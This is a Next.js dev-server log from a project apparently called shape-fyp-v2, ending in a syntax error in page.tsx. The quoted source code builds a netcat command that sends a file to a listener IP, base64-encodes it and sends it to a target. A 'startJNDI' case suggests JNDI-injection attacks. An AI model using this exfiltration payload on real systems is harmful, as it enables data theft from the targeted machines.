
> frontend@0.1.0 dev C:\Users\chriswong\Documents\Repositories\shape-fyp-v2\frontend
> next dev

  ▲ Next.js 14.2.3
  - Local:        http://localhost:3000

 ✓ Starting...
 ✓ Ready in 2.3s
 ○ Compiling / ...
 ✓ Compiled / in 2.8s (3067 modules)
 GET / 200 in 3269ms
 ✓ Compiled in 586ms (3067 modules)
 ✓ Compiled in 342ms (3067 modules)
 GET / 200 in 352ms
 ✓ Compiled /favicon.ico in 370ms (1599 modules)
 GET /favicon.ico 200 in 437ms
 ✓ Compiled in 426ms (3097 modules)
 ✓ Compiled in 338ms (3067 modules)
 GET / 200 in 315ms
 ✓ Compiled /favicon.ico in 143ms (1599 modules)
 GET /favicon.ico 200 in 201ms
 ✓ Compiled in 447ms (3097 modules)
 ✓ Compiled in 327ms (3067 modules)
 ✓ Compiled in 538ms (3067 modules)
 ✓ Compiled in 325ms (3067 modules)
 ✓ Compiled in 221ms (3067 modules)
 GET / 200 in 303ms
 ✓ Compiled /favicon.ico in 224ms (1599 modules)
 GET /favicon.ico 200 in 285ms
 ✓ Compiled in 505ms (3067 modules)
 ✓ Compiled in 310ms (3067 modules)
 ✓ Compiled in 578ms (3067 modules)
 ✓ Compiled in 342ms (3067 modules)
 ✓ Compiled in 223ms (3067 modules)
 ⨯ ./src/app/page.tsx
Error: 
  [31mx[0m Expected unicode escape
     ,-[[36;1;4mC:\Users\chriswong\Documents\Repositories\shape-fyp-v2\frontend\src\app\page.tsx[0m:109:1]
 [2m109[0m |                     const payload = `nc -w 3 ${state.intIP} 1304 < ${state.filename}`;
 [2m110[0m |                     const base64payload = btoa(state.payload ? state.payload : payload);
 [2m111[0m |                     const payloadResult = await sendPayload(base64payload, state.targetIP);
 [2m112[0m |                     newConsoleLog += `Target IP: ${state.targetIP}`\n`Payload: ${state.payload ? state.payload : payload}\n${payloadResult.message ? `Result: ${payloadResult.message}` : `Error: ${payloadResult.error}`}`;
     : [31;1m                                                                   ^[0m
 [2m113[0m |                 }
 [2m114[0m |                 break;
 [2m114[0m |             case 'startJNDI':
     `----

Caused by:
    Syntax Error

Import trace for requested module:
./src/app/page.tsx
 ✓ Compiled in 387ms (3067 modules)
